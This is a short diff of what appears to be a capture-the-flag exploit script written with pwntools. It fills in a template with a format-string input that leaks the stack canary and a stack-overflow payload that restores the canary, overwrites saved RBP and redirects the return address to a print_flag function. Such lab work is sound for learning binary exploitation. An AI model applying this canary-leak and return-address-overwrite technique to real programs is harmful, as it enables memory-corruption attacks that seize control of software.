@@ -8,17 +8,20 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"xxx") #Add your code here
+r.sendline(b"%19$lu") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
-# log.info(val)
+#log.info(val)
 canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
-log.info(f"Canary: {canary:x}")
+#log.info(f"Canary: {canary:x}")
 
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = # Add your payload here
+payload = b"A" * 72          # fill buffer
+payload += p64(canary)       # restored leaked canary (8 bytes)
+payload += b"B" * 8          # overwrite saved RBP
+payload += p64(win)          # new return address -> call print_flag
 r.sendline(payload)
 
 r.recvline()
